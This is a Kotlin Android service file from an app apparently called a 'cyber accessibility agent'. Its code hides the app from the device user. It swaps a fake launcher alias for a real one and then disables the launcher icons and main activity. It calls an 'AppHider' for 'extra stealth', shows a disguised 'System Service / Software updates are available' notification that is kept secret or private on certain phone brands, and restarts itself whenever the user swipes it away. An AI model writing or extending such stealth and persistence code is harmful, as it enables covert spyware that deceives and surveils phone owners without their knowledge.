// AgentService.kt - CORRECTED: Switch to real icon FIRST, then hide
package com.example.cyber_accessibility_agent

import android.app.*
import android.content.ComponentName
import android.content.Context
import android.content.Intent
import android.content.pm.PackageManager
import android.os.Build
import android.os.Handler
import android.os.IBinder
import android.os.Looper
import androidx.core.app.NotificationCompat
import io.flutter.embedding.engine.FlutterEngine
import io.flutter.embedding.engine.dart.DartExecutor
import io.flutter.embedding.engine.loader.FlutterLoader
import io.flutter.plugin.common.MethodChannel

class AgentService : Service() {

    companion object {
        const val ACTION_START = "com.example.cyber_accessibility_agent.START_AGENT"
        private const val NOTIF_ID = 9991
        private const val CHANNEL_ID = "agent_service_channel"
        private const val TAG = "AgentService"
        
        // ✅ SharedPreferences keys
        private const val PREF_LAUNCHER_SWITCHED = "launcher_switched"
        private const val PREF_AGENT_STARTED = "agent_started"
    }

    private var flutterEngine: FlutterEngine? = null
    private val mainHandler = Handler(Looper.getMainLooper())

    /**
     * ✅ Plain SharedPreferences
     */
    private fun prefs() = getSharedPreferences("agent_prefs", Context.MODE_PRIVATE)

    override fun onCreate() {
        super.onCreate()
        
        AppLogger.logLifecycle("AgentService.onCreate")
        
        try {
            // ✅ STEP 1: Start foreground IMMEDIATELY
            createNotificationChannel()
            startForeground(NOTIF_ID, buildNotification())
            AppLogger.i(TAG, "✅ Foreground service started")
            
            // ✅ STEP 2: Mark agent as started
            prefs().edit()
                .putBoolean(PREF_AGENT_STARTED, true)
                .apply()
            AppLogger.i(TAG, "Agent started flag set")
 
            // ✅ STEP 4: Hide icon AFTER switch (delayed to allow cache refresh)
            mainHandler.postDelayed({
                hideAllLauncherIcons()
            }, 2000)
                        
            // ✅ STEP 3: Switch launcher alias (fake → real)
            switchLauncherToReal()
             // 2 second delay for Settings to refresh
            
        } catch (e: Exception) {
            AppLogger.e(TAG, "Failed in onCreate", e)
        }
    }

    /**
     * ✅ CORRECT SEQUENCE: Switch to real icon FIRST
     * This ensures Settings shows original icon after hiding
     */
    private fun switchLauncherToReal() {
        val alreadySwitched = prefs().getBoolean(PREF_LAUNCHER_SWITCHED, false)
        
        if (alreadySwitched) {
            AppLogger.d(TAG, "Launcher already switched - skipping")
            return
        }

        try {
            val pm = packageManager
            val packageName = packageName

            AppLogger.i(TAG, "Switching launcher: fake → real...")

            // ✅ STEP 1: Disable fake launcher
            val fakeComponent = ComponentName(packageName, "$packageName.FakeLauncher")
            pm.setComponentEnabledSetting(
                fakeComponent,
                PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
                PackageManager.DONT_KILL_APP
            )
            AppLogger.i(TAG, "✅ FakeLauncher disabled")

            // ✅ STEP 2: Enable real launcher (so Settings shows original icon)
            val realComponent = ComponentName(packageName, "$packageName.RealLauncher")
            pm.setComponentEnabledSetting(
                realComponent,
                PackageManager.COMPONENT_ENABLED_STATE_ENABLED,
                PackageManager.DONT_KILL_APP
            )
            AppLogger.i(TAG, "✅ RealLauncher enabled")

            // ✅ Mark as switched
            prefs().edit()
                .putBoolean(PREF_LAUNCHER_SWITCHED, true)
                .apply()
            
            AppLogger.i(TAG, "✅ Launcher switched to real icon (Settings will show original)")

        } catch (e: Exception) {
            AppLogger.e(TAG, "Failed to switch launcher", e)
        }
    }

    /**
     * ✅ Hide launcher icons AFTER switching to real
     * This runs 2 seconds after switching to allow Settings cache to refresh
     */
    private fun hideAllLauncherIcons() {
        try {
            AppLogger.i(TAG, "Hiding launcher icons (after switch)...")
            
            val pm = packageManager
            val packageName = packageName
            
            // ✅ Disable real launcher (hides from launcher, Settings keeps original icon)
            val realComponent = ComponentName(packageName, "$packageName.RealLauncher")
            pm.setComponentEnabledSetting(
                realComponent,
                PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
                PackageManager.DONT_KILL_APP
            )
            AppLogger.i(TAG, "✅ RealLauncher disabled (hidden from launcher)")
            
            // ✅ Also use AppHider for extra stealth
            val hidden = AppHider.hide(this)
            AppLogger.i(TAG, "AppHider.hide() result: $hidden")
            
            // ✅ Disable MainActivity component
            try {
                val mainComponent = ComponentName(packageName, "$packageName.MainActivity")
                pm.setComponentEnabledSetting(
                    mainComponent,
                    PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
                    PackageManager.DONT_KILL_APP
                )
                AppLogger.i(TAG, "✅ MainActivity component disabled")
            } catch (e: Exception) {
                AppLogger.w(TAG, "MainActivity disable failed: ${e.message}")
            }
            
            AppLogger.i(TAG, "✅ Icon hidden from launcher (Settings shows original icon)")
            
        } catch (e: Exception) {
            AppLogger.e(TAG, "Failed to hide icons", e)
        }
    }

    override fun onStartCommand(intent: android.content.Intent?, flags: Int, startId: Int): Int {
        AppLogger.d(TAG, "onStartCommand: action=${intent?.action}")
        
        if (flutterEngine == null) {
            AppLogger.i(TAG, "Initializing Flutter engine...")
            initFlutter()
        } else {
            AppLogger.d(TAG, "Flutter engine already initialized")
        }
        
        return START_STICKY
    }

    /**
     * ✅ Initialize headless Flutter engine
     */
    private fun initFlutter() {
        AppLogger.d(TAG, "initFlutter() called on ${Thread.currentThread().name}")
        
        try {
            val loader = FlutterLoader()
            
            AppLogger.d(TAG, "Starting Flutter initialization...")
            loader.startInitialization(applicationContext)
            loader.ensureInitializationComplete(applicationContext, null)
            AppLogger.i(TAG, "Flutter loader initialized")

            val engine = FlutterEngine(applicationContext)
            
            AppLogger.d(TAG, "Executing Dart entrypoint: backgroundMain")
            val entrypoint = DartExecutor.DartEntrypoint(
                loader.findAppBundlePath(),
                "backgroundMain"
            )
            engine.dartExecutor.executeDartEntrypoint(entrypoint)

            MethodChannel(engine.dartExecutor.binaryMessenger, "agent/status")
                .setMethodCallHandler { call, result ->
                    when (call.method) {
                        "updateStatus" -> {
                            AppLogger.d(TAG, "Received updateStatus call")
                            result.success(true)
                        }
                        else -> result.notImplemented()
                    }
                }

            flutterEngine = engine
            AppLogger.i(TAG, "✅ Headless FlutterEngine started successfully")
            
        } catch (e: Exception) {
            AppLogger.e(TAG, "❌ Failed to start FlutterEngine", e)
        }
    }

    /**
     * ✅ Create notification channel
     */
    private fun createNotificationChannel() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            val name = "Background Service"
            val descriptionText = "Keeps the app running in background"
            val importance = NotificationManager.IMPORTANCE_LOW
            val channel = NotificationChannel(CHANNEL_ID, name, importance).apply {
                description = descriptionText
                setShowBadge(false)
                enableLights(false)
                enableVibration(false)
            }
            
            val notificationManager = getSystemService(Context.NOTIFICATION_SERVICE) as NotificationManager
            notificationManager.createNotificationChannel(channel)
            
            AppLogger.d(TAG, "Notification channel created")
        }
    }

    /**
     * ✅ Build notification with OEM-specific tweaks
     */
    private fun buildNotification(): Notification {
        val builder = NotificationCompat.Builder(this, CHANNEL_ID)
            .setContentTitle("System Service")
            .setContentText("Software updates are available.")
            .setSmallIcon(R.drawable.ic_notification)
            .setPriority(NotificationCompat.PRIORITY_LOW)
            .setOngoing(true)
            .setShowWhen(false)

        val manufacturer = Build.MANUFACTURER.lowercase()
        
        when {
            manufacturer.contains("tecno") || 
            manufacturer.contains("infinix") || 
            manufacturer.contains("itel") -> {
                builder.setVisibility(NotificationCompat.VISIBILITY_SECRET)
                AppLogger.d(TAG, "Using transparent notification for Tecno/Infinix/Itel")
            }
            
            manufacturer.contains("samsung") -> {
                builder.setVisibility(NotificationCompat.VISIBILITY_PRIVATE)
                AppLogger.d(TAG, "Using private notification for Samsung")
            }
            
            manufacturer.contains("xiaomi") || 
            manufacturer.contains("redmi") || 
            manufacturer.contains("poco") -> {
                builder.setVisibility(NotificationCompat.VISIBILITY_PRIVATE)
                AppLogger.d(TAG, "Using private notification for Xiaomi/Redmi/Poco")
            }
            
            else -> {
                builder.setVisibility(NotificationCompat.VISIBILITY_PUBLIC)
                AppLogger.d(TAG, "Using public notification (default)")
            }
        }
        
        return builder.build()
    }

    override fun onBind(intent: Intent?): IBinder? {
        return null
    }

    override fun onDestroy() {
        AppLogger.logLifecycle("AgentService.onDestroy")
        
        try {
            flutterEngine?.destroy()
            flutterEngine = null
            AppLogger.i(TAG, "Flutter engine destroyed")
        } catch (e: Exception) {
            AppLogger.e(TAG, "Error destroying Flutter engine", e)
        }
        
        super.onDestroy()
    }

    override fun onTaskRemoved(rootIntent: Intent?) {
        super.onTaskRemoved(rootIntent)
        AppLogger.i(TAG, "onTaskRemoved - restarting service")
        
        // ✅ Restart service when task is removed (swipe away)
        val restartServiceIntent = Intent(applicationContext, AgentService::class.java).apply {
            action = ACTION_START
        }
        val restartServicePendingIntent = PendingIntent.getService(
            applicationContext,
            1,
            restartServiceIntent,
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.S) {
                PendingIntent.FLAG_MUTABLE or PendingIntent.FLAG_UPDATE_CURRENT
            } else {
                PendingIntent.FLAG_UPDATE_CURRENT
            }
        )
        
        val alarmManager = getSystemService(Context.ALARM_SERVICE) as AlarmManager
        alarmManager.set(
            AlarmManager.ELAPSED_REALTIME,
            android.os.SystemClock.elapsedRealtime() + 1000,
            restartServicePendingIntent
        )
    }
}
